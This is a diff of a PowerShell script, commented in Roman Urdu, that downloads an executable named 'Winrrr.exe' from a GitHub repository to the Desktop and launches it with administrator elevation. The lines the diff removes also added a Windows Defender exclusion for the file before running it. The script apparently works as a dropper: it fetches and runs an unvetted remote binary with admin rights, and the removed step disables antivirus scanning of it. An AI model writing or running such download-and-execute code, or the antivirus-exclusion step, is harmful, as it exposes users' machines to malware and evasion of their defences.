@@ -1,46 +1,38 @@
-# 1. Desktop path set karein
-$desktopPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Desktop"), "Winrrr.exe")
+# 1. System-Wide Network Layer Fix (TLS 1.2 Configuration)
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# 2. GitHub Raw Application Download URL
-$url = "https://githubusercontent.com"
+# 2. Local Paths aur Targets Definition
+$desktopPath = [System.IO.Path]::Combine([Environment]::GetFolderPath("Desktop"), "Winrrr.exe")
+$url = "https://github.com/afnan-altaf/winrrr/raw/refs/heads/main/Winrrr.exe"
 
 try {
-    Write-Host "[INFO] File download ho rahi hai..." -ForegroundColor Cyan
+    Write-Host "[INFO] Secure connection built. Downloading file..." -ForegroundColor Cyan
     
-    # [FIX] Decryption Error ko hal karne ke liye system ke saare TLS/SSL channels unblock karna
-    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13 -bor [Net.SecurityProtocolType]::Ssl3
+    # 3. Standard Web Request Method
+    Invoke-WebRequest -Uri $url -OutFile $desktopPath -UseBasicParsing
     
-    # Live cache clear ke sath pure binary request pull karna
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $webClient.DownloadFile($url, $desktopPath)
-    
-    # 3. Validation Check (MZ Header Verification)
+    # 4. Binary Integrity Verification (Check if valid Windows format)
     $fileContent = Get-Content -Path $desktopPath -TotalCount 1 -Encoding Ascii
     if ($fileContent -notmatch "^MZ") {
-        throw "Downloaded file valid Windows application (.EXE) nahi hai! Check karein ke repository public hai ya nahi."
+        throw "Downloaded file valid Windows binary (.EXE) nahi hai. Link ya repository status verify karein."
     }
     
-    Write-Host "[SUCCESS] Valid Executable File Desktop par download ho gayi hai." -ForegroundColor Green
+    Write-Host "[SUCCESS] File Desktop par save ho chuki hai." -ForegroundColor Green
 
-    # 4. Windows Defender Exclusion List setup
-    Write-Host "[INFO] Windows Defender mein exclusion add ho raha hai..." -ForegroundColor Cyan
-    Add-MpPreference -ExclusionPath $desktopPath
-    
-    # 5. Application Core Engine Execution Setup
-    Write-Host "[INFO] Application chalayi ja rahi hai..." -ForegroundColor Cyan
+    # 5. Standard Process Trigger with UAC Elevation Request
+    Write-Host "[INFO] User Account Control (UAC) prompt trigger ho raha hai..." -ForegroundColor Cyan
     
     $psi = New-Object System.Diagnostics.ProcessStartInfo
     $psi.FileName = $desktopPath
-    $psi.Verb = "runas"
+    $psi.Verb = "runas"  # Standard Windows Administration Prompt Request
     $psi.UseShellExecute = $true
     [System.Diagnostics.Process]::Start($psi) | Out-Null
     
-    Write-Host "[SUCCESS] Process mukammal ho gaya!" -ForegroundColor Green
+    Write-Host "[SUCCESS] Application launch execution forward kar di gayi hai." -ForegroundColor Green
 }
 catch {
-    Write-Host "[ERROR] Kuch masla aya hai: $_" -ForegroundColor Red
+    Write-Host "[ERROR] Process ruk gaya hai: $_" -ForegroundColor Red
     
-    # Ghalat download ko remove karna
+    # Clean up corrupted file if any
     if (Test-Path $desktopPath) { Remove-Item $desktopPath -Force }
 }
